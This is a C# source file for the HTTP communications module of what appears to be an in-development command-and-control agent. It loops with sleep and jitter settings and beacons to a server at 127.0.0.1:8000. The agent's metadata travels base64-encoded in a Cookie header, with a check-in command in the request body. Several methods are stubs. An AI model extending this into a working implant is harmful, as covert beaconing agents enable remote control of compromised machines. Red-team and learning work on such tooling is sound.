using AgentCore;
using AgentCore.Controllers;
using AgentCore.Interfaces;
using AgentCore.Models;
using AgentCore.Modules;
using Common;
using Common.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HttpAgent.Modules
{
    class HttpCommModule : ICommModule
    {
        private ConfigController Config { get; set; }
        public ModuleStatus ModuleStatus { get; set; }
        //private WebClient WebClient { get; set; } = new WebClient();
        private int MaxRetryCount { get; } = 10;
        private int RetryCount { get; set; } = 0;

        public void Init(ConfigController config)
        {
            ModuleStatus = ModuleStatus.Starting;
            Config = config;

            //WebClient.DownloadDataCompleted += DownloadDataCallback;
            //WebClient.Headers.Clear();
        }

        public bool RecvData()
        {
            return false;
            //throw new NotImplementedException();
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            //Task.Factory.StartNew(delegate ()
            //{
                while (ModuleStatus == ModuleStatus.Running)
                {
                    var sleepTime = (int)Config.GetOption(ConfigSetting.SleepTime) * 1000;
                    var jitter = (int)Config.GetOption(ConfigSetting.Jitter);

                    // caclulate difference

                    Thread.Sleep(sleepTime);

                    AgentCheckIn();
                }
            //});
        }

        public void SendData()
        {
            throw new NotImplementedException();
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }

        private void AgentCheckIn()
        {
            //var metadata = Helpers.SerialiseData<Metadata>(Config.GetOption(ConfigSetting.Metadata) as Metadata);
            //WebClient.Headers.Add("Cookie", Convert.ToBase64String(metadata));

            //WebClient.DownloadDataAsync(new Uri("http://127.0.0.1:8000/test"));

            var metadata = Convert.ToBase64String(
                Serialisation.SerialiseData<Metadata>(
                    Config.GetOption(ConfigSetting.Metadata) as Metadata
                    ));

            var c2data = Convert.ToBase64String(
                Serialisation.SerialiseData<C2Data>(new C2Data
                {
                    Module = "Core",
                    Command = "AgentCheckIn"
                }));

            using (var client = new WebClient())
            {
                client.Headers.Clear();
                client.DownloadDataCompleted += DownloadDataCallback;
                client.UploadDataCompleted += UploadDataCallback;
                client.Headers[HttpRequestHeader.Cookie] = metadata;

                if (client.IsBusy) { Thread.Sleep(500); }

                client.UploadDataAsync(new Uri($"http://127.0.0.1:8000/test"), Encoding.UTF8.GetBytes($"Data={c2data}"));
            }

        }

        private void UploadDataCallback(object sender, UploadDataCompletedEventArgs e)
        {
            try
            {
                var response = e.Result;
                Console.WriteLine(Encoding.UTF8.GetString(response));
            }
            catch
            {
                IncrementRetryCount();
            }
        }

        private void IncrementRetryCount()
        {
            RetryCount += 1;
        }

        private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
        {
            var response = e.Result;
            Console.WriteLine(Encoding.UTF8.GetString(response));
        }
    }
}
